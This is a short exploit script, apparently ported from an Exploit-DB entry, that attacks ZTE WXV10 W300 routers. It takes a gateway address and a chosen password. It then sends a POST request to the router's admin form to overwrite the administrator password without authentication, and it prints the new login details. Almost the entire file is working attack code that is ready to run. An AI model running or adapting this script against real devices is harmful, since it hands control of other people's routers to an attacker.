/**
* Title: ZTE WXV10 W300 CSRF Vulnerability
* Discovered by: Osanda Malith Jayathissa
* Exploit from https://www.exploit-db.com/exploits/33803/
*/

load "http/curl"

print "ZTE WXV10 W300 CSRF Vulnerability\n"
print "IP Gateway: "
input.start()
    @gateway = input.value
    @exploit = "/Forms/tools_admin_1"
input.close()

print "Set password admin: "
input.start()
    @password = input.value
    curl.post(@gateway.@exploit,array("uiViewTools_Password"=> @password, "uiViewTools_PasswordConfirm"=> @password))
    
    print "\nGateway: ".@gateway."\n"
    print "Username: admin\n"
    print "Password: ".@password."\n"
input.close()